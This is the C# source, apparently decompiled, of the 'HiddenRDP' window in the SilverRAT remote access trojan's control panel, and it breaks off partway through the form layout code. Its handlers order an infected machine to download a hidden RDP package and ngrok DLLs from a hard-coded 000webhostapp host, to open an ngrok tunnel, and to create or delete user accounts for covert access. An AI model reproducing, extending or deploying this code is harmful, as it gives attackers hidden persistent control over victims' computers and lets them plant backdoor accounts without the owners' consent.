using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Server.Helper;
using SilverRAT.Connection;
using SilverRAT.Handle_Packet;
using SilverRAT.MessagePack;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class HiddenRDP : Form
{
    private IContainer components = null;

    private BunifuElipse FormElipse;

    private BunifuDragControl FormDragControl1;

    public System.Windows.Forms.Timer Timer1;

    private Panel panelForm;

    private BunifuPanel PanelTitle;

    public BunifuLoader LoaderConnect;

    private BunifuLabel UserIdInfo;

    private BunifuLabel bunifuLabel1;

    private PictureBox ImageLogo;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private Panel PaneControll;

    private Guna2Button ButNagrok;

    private Guna2Button ButInstall;

    private Guna2Button ButAccount;

    private BunifuPages PageRDP;

    private TabPage PageInstall;

    private TabPage PageNagrok;

    private TabPage PageAccount;

    public Guna2GradientButton guna2GradientButton_0;

    private BunifuLabel TitlrPage;

    private PictureBox pictureBox2;

    public Guna2GradientButton ConnectNagrok;

    private BunifuTextBox TokenNagrok;

    private BunifuLabel bunifuLabel4;

    public BunifuLabel LogsInstallRDP;

    public BunifuLabel LogsNagrok;

    private BunifuTextBox Password;

    private BunifuTextBox TxUserName;

    public Guna2GradientButton CreateAccount;

    public Guna2GradientButton DeleteAccount;

    private ColumnHeader columnHeader1;

    private ColumnHeader columnHeader2;

    private ColumnHeader columnHeader3;

    internal AeroListView ListAllUsernsmr;

    public BunifuTextBox HostNagrok;

    private PictureBox pictureBox3;

    private Guna2CircleButton ButtClose;

    private Guna2CircleButton ButtionMinimized;

    public Bitmap Logo { get; set; }

    public FormSilver F { get; set; }

    internal Clients ParentClient { get; set; }

    internal Clients Client { get; set; }

    public bool Admin { get; set; }

    public HiddenRDP()
    {
        InitializeComponent();
        MinimumSize = base.Size;
    }

    private void HiddenRDP_Load(object sender, EventArgs e)
    {
        try
        {
            string userIDClient = Packet.GetUserIDClient(ParentClient.DGV);
            UserIdInfo.Text = userIDClient;
            userIDClient.Split('\\');
        }
        catch
        {
            UserIdInfo.Text = "Not Found!";
        }
        try
        {
            FormElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
            if (Logo != null)
            {
                ImageLogo.Image = Logo;
            }
        }
        catch
        {
        }
    }

    private void HiddenRDP_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        Close();
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
        try
        {
            if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
            {
                ThreadPool.QueueUserWorkItem(delegate
                {
                    Client?.Disconnected();
                });
                Close();
            }
        }
        catch
        {
        }
    }

    private void HiddenRDP_FormClosing(object sender, FormClosingEventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            ThreadPool.QueueUserWorkItem(delegate
            {
                Client?.Disconnected();
            });
        }
        catch
        {
        }
    }

    private void ButInstall_Click(object sender, EventArgs e)
    {
        PageRDP.SelectedIndex = 0;
        TitlrPage.Text = "Installation";
    }

    private void ButNagrok_Click(object sender, EventArgs e)
    {
        PageRDP.SelectedIndex = 1;
        TitlrPage.Text = "Open tunnel";
    }

    private void ButAccount_Click(object sender, EventArgs e)
    {
        PageRDP.SelectedIndex = 2;
        TitlrPage.Text = "Create an account";
    }

    private void InstallRDP_Click(object sender, EventArgs e)
    {
        try
        {
            if (!Admin)
            {
                MessageBox.Show(this, "This feature requires administrator privileges, please run the client as an administrator", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
            }
            else if (guna2GradientButton_0.Text == "Install")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "InstallRDP";
                msgPack.ForcePathObject("RdpUrl").AsString = "https://softwares500.000webhostapp.com/RAP.zip";
                msgPack.ForcePathObject("Pass").AsString = "HRDP";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                guna2GradientButton_0.Text = "Install...";
                guna2GradientButton_0.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "UnstallRDP";
                msgPack2.ForcePathObject("RdpUrl").AsString = "https://softwares500.000webhostapp.com/RAP.zip";
                msgPack2.ForcePathObject("Pass").AsString = "HRDP";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                guna2GradientButton_0.Text = "Uninstall...";
                guna2GradientButton_0.Enabled = false;
            }
        }
        catch
        {
        }
    }

    private void ConnectNagrok_Click(object sender, EventArgs e)
    {
        try
        {
            if (ConnectNagrok.Text == "Connect")
            {
                if (string.IsNullOrEmpty(TokenNagrok.Text))
                {
                    MessageBox.Show(this, "Please enter the Your Authtoken", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "ConnectNagrok";
                msgPack.ForcePathObject("Token").AsString = TokenNagrok.Text;
                msgPack.ForcePathObject("nagrok64").AsString = "https://softwares500.000webhostapp.com/N64.dll";
                msgPack.ForcePathObject("nagrok32").AsString = "https://softwares500.000webhostapp.com/N32.dll";
                msgPack.ForcePathObject("Pass").AsString = "HRDP";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                ConnectNagrok.Text = "Connection...";
                ConnectNagrok.Enabled = false;
            }
            else
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Packet").AsString = "DisconnectNagrok";
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
                ConnectNagrok.Text = "Disconnect...";
                ConnectNagrok.Enabled = false;
            }
        }
        catch
        {
        }
    }

    private void CreateAccount_Click(object sender, EventArgs e)
    {
        try
        {
            if (string.IsNullOrEmpty(TxUserName.Text))
            {
                MessageBox.Show(this, "Please enter the Username", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            if (string.IsNullOrEmpty(Password.Text))
            {
                MessageBox.Show(this, "Please enter the Password", "Hidden RDP!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
            MsgPack msgPack = new MsgPack();
            msgPack.ForcePathObject("Packet").AsString = "CreateUser";
            msgPack.ForcePathObject("User").AsString = TxUserName.Text;
            msgPack.ForcePathObject("Pass").AsString = Password.Text;
            ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
            CreateAccount.Text = "Creating...";
            CreateAccount.Enabled = false;
        }
        catch
        {
        }
    }

    private void DeleteAccount_Click(object sender, EventArgs e)
    {
        try
        {
            if (ListAllUsernsmr.SelectedItems.Count != 0)
            {
                string asString = ListAllUsernsmr.SelectedItems[0].Text;
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Packet").AsString = "DeleteUser";
                msgPack.ForcePathObject("User").AsString = asString;
                ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
                DeleteAccount.Text = "Deleting...";
                DeleteAccount.Enabled = false;
            }
        }
        catch
        {
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        Utilities.BunifuPages.BunifuAnimatorNS.Animation animation = new Utilities.BunifuPages.BunifuAnimatorNS.Animation();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.HiddenRDP));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties9 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties10 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties11 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties12 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties13 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties14 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties15 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties16 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.PageRDP = new Bunifu.UI.WinForms.BunifuPages();
        this.PageInstall = new System.Windows.Forms.TabPage();
        this.pictureBox2 = new System.Windows.Forms.PictureBox();
        this.LogsInstallRDP = new Bunifu.UI.WinForms.BunifuLabel();
        this.guna2GradientButton_0 = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PageNagrok = new System.Windows.Forms.TabPage();
        this.bunifuLabel4 = new Bunifu.UI.WinForms.BunifuLabel();
        this.LogsNagrok = new Bunifu.UI.WinForms.BunifuLabel();
        this.ConnectNagrok = new Guna.UI2.WinForms.Guna2GradientButton();
        this.TokenNagrok = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PageAccount = new System.Windows.Forms.TabPage();
        this.pictureBox3 = new System.Windows.Forms.PictureBox();
        this.Password = new Bunifu.UI.WinForms.BunifuTextBox();
        this.TxUserName = new Bunifu.UI.WinForms.BunifuTextBox();
        this.CreateAccount = new Guna.UI2.WinForms.Guna2GradientButton();
        this.DeleteAccount = new Guna.UI2.WinForms.Guna2GradientButton();
        this.ListAllUsernsmr = new Server.Helper.AeroListView();
        this.columnHeader1 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader2 = new System.Windows.Forms.ColumnHeader();
        this.columnHeader3 = new System.Windows.Forms.ColumnHeader();
        this.HostNagrok = new Bunifu.UI.WinForms.BunifuTextBox();
        this.PaneControll = new System.Windows.Forms.Panel();
        this.ButNagrok = new Guna.UI2.WinForms.Guna2Button();
        this.ButInstall = new Guna.UI2.WinForms.Guna2Button();
        this.ButAccount = new Guna.UI2.WinForms.Guna2Button();
        this.PanelTitle = new Bunifu.UI.WinForms.BunifuPanel();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.TitlrPage = new Bunifu.UI.WinForms.BunifuLabel();
        this.LoaderConnect = new Bunifu.UI.WinForms.BunifuLoader();
        this.UserIdInfo = new Bunifu.UI.WinForms.BunifuLabel();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ImageLogo = new System.Windows.Forms.PictureBox();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.Timer1 = new System.Windows.Forms.Timer(this.components);
        this.panelForm.SuspendLayout();
        this.PageRDP.SuspendLayout();
        this.PageInstall.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).BeginInit();
        this.PageNagrok.SuspendLayout();
        this.PageAccount.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.pictureBox3).BeginInit();
        this.PaneControll.SuspendLayout();
        this.PanelTitle.SuspendLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).BeginInit();
        base.SuspendLayout();
        this.FormElipse.ElipseRadius = 4;
        this.FormElipse.TargetControl = this.panelForm;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.PageRDP);
        this.panelForm.Controls.Add(this.PaneControll);
        this.panelForm.Controls.Add(this.PanelTitle);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(590, 438);
        this.panelForm.TabIndex = 573;
        this.panelForm.Visible = false;
        this.PageRDP.Alignment = System.Windows.Forms.TabAlignment.Bottom;
        this.PageRDP.AllowTransitions = false;
        this.PageRDP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PageRDP.Controls.Add(this.PageInstall);
        this.PageRDP.Controls.Add(this.PageNagrok);
        this.PageRDP.Controls.Add(this.PageAccount);
        this.PageRDP.Location = new System.Drawing.Point(67, 112);
        this.PageRDP.Multiline = true;
        this.PageRDP.Name = "PageRDP";
        this.PageRDP.Page = this.PageNagrok;
        this.PageRDP.PageIndex = 1;
        this.PageRDP.PageName = "PageNagrok";
        this.PageRDP.PageTitle = "Nagrok";
        this.PageRDP.SelectedIndex = 0;
        this.PageRDP.Size = new System.Drawing.Size(507, 280);
        this.PageRDP.TabIndex = 609;
        animation.AnimateOnlyDifferences = false;
        animation.BlindCoeff = (System.Drawing.PointF)resources.GetObject("animation1.BlindCoeff");
        animation.LeafCoeff = 0f;
        animation.MaxTime = 1f;
        animation.MinTime = 0f;
        animation.MosaicCoeff = (System.Drawing.PointF)resources.GetObject("animation1.MosaicCoeff");
        animation.MosaicShift = (System.Drawing.PointF)resources.GetObject("animation1.MosaicShift");
        animation.MosaicSize = 0;
        animation.Padding = new System.Windows.Forms.Padding(0);
        animation.RotateCoeff = 0f;
        animation.RotateLimit = 0f;
        animation.ScaleCoeff = (System.Drawing.PointF)resources.GetObject("animation1.ScaleCoeff");
        animation.SlideCoeff = (System.Drawing.PointF)resources.GetObject("animation1.SlideCoeff");
        animation.TimeCoeff = 0f;
        animation.TransparencyCoeff = 0f;
        this.PageRDP.Transition = animation;
        this.PageRDP.TransitionType = Utilities.BunifuPages.BunifuAnimatorNS.AnimationType.Custom;
        this.PageInstall.Controls.Add(this.pictureBox2);
        this.PageInstall.Controls.Add(this.LogsInstallRDP);
        this.PageInstall.Controls.Add(this.guna2GradientButton_0);
        this.PageInstall.Location = new System.Drawing.Point(4, 4);
        this.PageInstall.Name = "PageInstall";
        this.PageInstall.Size = new System.Drawing.Size(499, 254);
        this.PageInstall.TabIndex = 0;
        this.PageInstall.Text = "Install";
        this.PageInstall.UseVisualStyleBackColor = true;
        this.pictureBox2.Image = (System.Drawing.Image)resources.GetObject("pictureBox2.Image");
        this.pictureBox2.Location = new System.Drawing.Point(19, 20);
        this.pictureBox2.Name = "pictureBox2";
        this.pictureBox2.Size = new System.Drawing.Size(74, 56);
        this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox2.TabIndex = 673;
        this.pictureBox2.TabStop = false;
        this.LogsInstallRDP.AllowParentOverrides = false;
        this.LogsInstallRDP.AutoEllipsis = false;
        this.LogsInstallRDP.AutoSize = false;
        this.LogsInstallRDP.BackColor = System.Drawing.Color.White;
        this.LogsInstallRDP.CursorType = null;
        this.LogsInstallRDP.Font = new System.Drawing.Font("Segoe UI", 14f);
        this.LogsInstallRDP.ForeColor = System.Drawing.Color.Black;
        this.LogsInstallRDP.Location = new System.Drawing.Point(20, 130);
        this.LogsInstallRDP.Name = "LogsInstallRDP";
        this.LogsInstallRDP.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.LogsInstallRDP.Size = new System.Drawing.Size(462, 25);
        this.LogsInstallRDP.TabIndex = 672;
        this.LogsInstallRDP.Text = "...";
        this.LogsInstallRDP.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.LogsInstallRDP.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.guna2GradientButton_0.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.guna2GradientButton_0.BackColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.BorderRadius = 4;
        this.guna2GradientButton_0.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_0.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_0.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_0.CheckedState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_0.CustomImages.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_0.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_0.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.guna2GradientButton_0.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_0.HoverState.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Location = new System.Drawing.Point(353, 199);
        this.guna2GradientButton_0.Name = "InstallRDP";
        this.guna2GradientButton_0.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2GradientButton_0.PressedDepth = 50;
        this.guna2GradientButton_0.ShadowDecoration.Parent = this.guna2GradientButton_0;
        this.guna2GradientButton_0.Size = new System.Drawing.Size(109, 29);
        this.guna2GradientButton_0.TabIndex = 671;
        this.guna2GradientButton_0.Text = "Install";
        this.guna2GradientButton_0.Click += new System.EventHandler(InstallRDP_Click);
        this.PageNagrok.Controls.Add(this.bunifuLabel4);
        this.PageNagrok.Controls.Add(this.LogsNagrok);
        this.PageNagrok.Controls.Add(this.ConnectNagrok);
        this.PageNagrok.Controls.Add(this.TokenNagrok);
        this.PageNagrok.Location = new System.Drawing.Point(4, 4);
        this.PageNagrok.Name = "PageNagrok";
        this.PageNagrok.Size = new System.Drawing.Size(499, 254);
        this.PageNagrok.TabIndex = 1;
        this.PageNagrok.Text = "Nagrok";
        this.PageNagrok.UseVisualStyleBackColor = true;
        this.bunifuLabel4.AllowParentOverrides = false;
        this.bunifuLabel4.AutoEllipsis = false;
        this.bunifuLabel4.AutoSize = false;
        this.bunifuLabel4.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel4.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel4.Font = new System.Drawing.Font("Segoe UI", 8f);
        this.bunifuLabel4.ForeColor = System.Drawing.Color.FromArgb(192, 0, 0);
        this.bunifuLabel4.Location = new System.Drawing.Point(10, 12);
        this.bunifuLabel4.Name = "bunifuLabel4";
        this.bunifuLabel4.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel4.Size = new System.Drawing.Size(471, 39);
        this.bunifuLabel4.TabIndex = 678;
        this.bunifuLabel4.Text = "Put Your Authtoken \r\nYour account, from your account on Nagrok In the event that you do not have an account, \r\ngo to the site from here - www.ngrok.com";
        this.bunifuLabel4.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel4.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.LogsNagrok.AllowParentOverrides = false;
        this.LogsNagrok.AutoEllipsis = false;
        this.LogsNagrok.AutoSize = false;
        this.LogsNagrok.BackColor = System.Drawing.Color.White;
        this.LogsNagrok.CursorType = null;
        this.LogsNagrok.Font = new System.Drawing.Font("Segoe UI", 14f);
        this.LogsNagrok.ForeColor = System.Drawing.Color.Black;
        this.LogsNagrok.Location = new System.Drawing.Point(17, 99);
        this.LogsNagrok.Name = "LogsNagrok";
        this.LogsNagrok.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.LogsNagrok.Size = new System.Drawing.Size(464, 25);
        this.LogsNagrok.TabIndex = 677;
        this.LogsNagrok.Text = "...";
        this.LogsNagrok.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.LogsNagrok.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ConnectNagrok.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.ConnectNagrok.BackColor = System.Drawing.Color.White;
        this.ConnectNagrok.BorderRadius = 4;
        this.ConnectNagrok.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ConnectNagrok.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ConnectNagrok.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.ConnectNagrok.CheckedState.Parent = this.ConnectNagrok;
        this.ConnectNagrok.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ConnectNagrok.CustomImages.Parent = this.ConnectNagrok;
        this.ConnectNagrok.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ConnectNagrok.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ConnectNagrok.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.ConnectNagrok.ForeColor = System.Drawing.Color.White;
        this.ConnectNagrok.HoverState.Parent = this.ConnectNagrok;
        this.ConnectNagrok.Location = new System.Drawing.Point(357, 203);
        this.ConnectNagrok.Name = "ConnectNagrok";
        this.ConnectNagrok.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.ConnectNagrok.PressedDepth = 50;
        this.ConnectNagrok.ShadowDecoration.Parent = this.ConnectNagrok;
        this.ConnectNagrok.Size = new System.Drawing.Size(111, 28);
        this.ConnectNagrok.TabIndex = 676;
        this.ConnectNagrok.Text = "Connect";
        this.ConnectNagrok.Click += new System.EventHandler(ConnectNagrok_Click);
        this.TokenNagrok.AcceptsReturn = false;
        this.TokenNagrok.AcceptsTab = false;
        this.TokenNagrok.AnimationSpeed = 200;
        this.TokenNagrok.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TokenNagrok.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TokenNagrok.AutoSizeHeight = true;
        this.TokenNagrok.BackColor = System.Drawing.Color.Transparent;
        this.TokenNagrok.BackgroundImage = (System.Drawing.Image)resources.GetObject("TokenNagrok.BackgroundImage");
        this.TokenNagrok.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TokenNagrok.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TokenNagrok.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TokenNagrok.BorderColorIdle = System.Drawing.Color.Silver;
        this.TokenNagrok.BorderRadius = 2;
        this.TokenNagrok.BorderThickness = 1;
        this.TokenNagrok.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TokenNagrok.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TokenNagrok.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TokenNagrok.DefaultText = "";
        this.TokenNagrok.FillColor = System.Drawing.Color.White;
        this.TokenNagrok.HideSelection = true;
        this.TokenNagrok.IconLeft = null;
        this.TokenNagrok.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TokenNagrok.IconPadding = 10;
        this.TokenNagrok.IconRight = null;
        this.TokenNagrok.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.TokenNagrok.Lines = new string[0];
        this.TokenNagrok.Location = new System.Drawing.Point(17, 140);
        this.TokenNagrok.MaxLength = 32767;
        this.TokenNagrok.MinimumSize = new System.Drawing.Size(1, 1);
        this.TokenNagrok.Modified = false;
        this.TokenNagrok.Multiline = false;
        this.TokenNagrok.Name = "TokenNagrok";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TokenNagrok.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TokenNagrok.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TokenNagrok.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TokenNagrok.OnIdleState = stateProperties4;
        this.TokenNagrok.Padding = new System.Windows.Forms.Padding(3);
        this.TokenNagrok.PasswordChar = '\0';
        this.TokenNagrok.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TokenNagrok.PlaceholderText = "Your Authtoken";
        this.TokenNagrok.ReadOnly = false;
        this.TokenNagrok.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TokenNagrok.SelectedText = "";
        this.TokenNagrok.SelectionLength = 0;
        this.TokenNagrok.SelectionStart = 0;
        this.TokenNagrok.ShortcutsEnabled = true;
        this.TokenNagrok.Size = new System.Drawing.Size(464, 28);
        this.TokenNagrok.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TokenNagrok.TabIndex = 675;
        this.TokenNagrok.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TokenNagrok.TextMarginBottom = 0;
        this.TokenNagrok.TextMarginLeft = 3;
        this.TokenNagrok.TextMarginTop = 1;
        this.TokenNagrok.TextPlaceholder = "Your Authtoken";
        this.TokenNagrok.UseSystemPasswordChar = false;
        this.TokenNagrok.WordWrap = true;
        this.PageAccount.Controls.Add(this.pictureBox3);
        this.PageAccount.Controls.Add(this.Password);
        this.PageAccount.Controls.Add(this.TxUserName);
        this.PageAccount.Controls.Add(this.CreateAccount);
        this.PageAccount.Controls.Add(this.DeleteAccount);
        this.PageAccount.Controls.Add(this.ListAllUsernsmr);
        this.PageAccount.Controls.Add(this.HostNagrok);
        this.PageAccount.Location = new System.Drawing.Point(4, 4);
        this.PageAccount.Name = "PageAccount";
        this.PageAccount.Size = new System.Drawing.Size(499, 254);
        this.PageAccount.TabIndex = 2;
        this.PageAccount.Text = "Account";
        this.PageAccount.UseVisualStyleBackColor = true;
        this.pictureBox3.Image = (System.Drawing.Image)resources.GetObject("pictureBox3.Image");
        this.pictureBox3.Location = new System.Drawing.Point(20, 14);
        this.pictureBox3.Name = "pictureBox3";
        this.pictureBox3.Size = new System.Drawing.Size(54, 38);
        this.pictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.pictureBox3.TabIndex = 683;
        this.pictureBox3.TabStop = false;
        this.Password.AcceptsReturn = false;
        this.Password.AcceptsTab = false;
        this.Password.AnimationSpeed = 200;
        this.Password.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.Password.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
